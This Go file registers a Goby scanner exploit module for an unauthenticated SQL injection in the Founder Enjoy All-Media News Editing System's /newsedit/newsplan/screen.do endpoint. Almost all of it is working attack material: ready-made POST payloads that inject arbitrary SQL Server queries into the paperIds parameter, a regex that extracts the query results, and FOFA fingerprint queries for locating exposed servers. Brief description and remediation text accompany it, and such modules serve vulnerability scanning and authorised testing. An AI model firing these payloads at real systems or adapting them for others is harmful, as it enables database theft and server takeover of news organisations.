package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Founder Enjoy All-Media News Editing System /newsedit/newsplan/screen.do SQL Injection Vulnerability",
    "Description": "<p>The Founder Enjoy All-Media News Editing System is an intelligent integrated media business platform widely used in various aspects of news production. The system's /newsedit/newsplan/screen.do interface has a SQL injection vulnerability, allowing unauthenticated attackers to exploit it to obtain sensitive information from the database (such as administrator backend passwords and user personal information) and even execute commands under high privileges to further gain server system access.</p>",
    "Product": "Founder Enjoy All-Media News Editing System",
    "Homepage": "http://www.founder.com.cn/",
    "DisclosureDate": "2024-12-19",
    "PostTime": "2024-12-24",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "GobyQuery": "body=\"/newsedit/newsedit/css/login_1.css\" || (title==\"方正畅享全媒体报道指挥平台\" && body=\"common/js/jquery.1.7.2.min.js\") || title=\"全媒体采编V3.0-工作平台登录\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection and may execute arbitrary commands under high privileges, leading to data leakage, system access being compromised, and other severe consequences.</p>",
    "Recommendation": "<p>It is recommended to close the internet exposure or set access permissions for the interface, and upgrade to a secure version to fix the vulnerability.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144588197?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/newsplan/screen.do",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=-2454+OR+6826+IN+%28SELECT+%28CHAR%28116%29%2BCHAR%2876%29%2BCHAR%2857%29%2BCHAR%28120%29%2BCHAR%28119%29%2BCHAR%2874%29%2BCHAR%28107%29%2BCHAR%2880%29%2BCHAR%2849%29%2BCHAR%2898%29%2BCHAR%2868%29%2BCHAR%28113%29%29%29&terminalType=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "tL9xwJkP1bDq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/newsedit/newsplan/screen.do",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=-2454+OR+6826+IN+%28SELECT+%28CHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%2B({{{payload_encode}}})%2BCHAR%28126%29%2BCHAR%28126%29%2BCHAR%28126%29%29%29&terminalType=123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123*&terminalType=123"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "方正畅享全媒体新闻采编系统 /newsedit/newsplan/screen.do SQL 注入漏洞",
            "Product": "方正畅享全媒体新闻采编系统",
            "Description": "<p>方正畅享全媒体新闻采编系统是一款智能化融合媒体业务平台，广泛应用于新闻生产的各个环节。该系统的 /newsedit/newsplan/screen.do 接口存在 SQL 注入漏洞，未经身份验证的攻击者可以利用该漏洞获取数据库中的敏感信息（如管理员后台密码、用户个人信息），甚至在高权限下执行命令，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>建议关闭互联网暴露面或对接口设置访问权限，同时升级至安全版本以修复该漏洞。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，并可能在高权限下执行任意命令，导致数据泄露、系统权限被获取等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Founder Enjoy All-Media News Editing System /newsedit/newsplan/screen.do SQL Injection Vulnerability",
            "Product": "Founder Enjoy All-Media News Editing System",
            "Description": "<p>The Founder Enjoy All-Media News Editing System is an intelligent integrated media business platform widely used in various aspects of news production. The system's /newsedit/newsplan/screen.do interface has a SQL injection vulnerability, allowing unauthenticated attackers to exploit it to obtain sensitive information from the database (such as administrator backend passwords and user personal information) and even execute commands under high privileges to further gain server system access.</p>",
            "Recommendation": "<p>It is recommended to close the internet exposure or set access permissions for the interface, and upgrade to a secure version to fix the vulnerability.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection and may execute arbitrary commands under high privileges, leading to data leakage, system access being compromised, and other severe consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|url_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}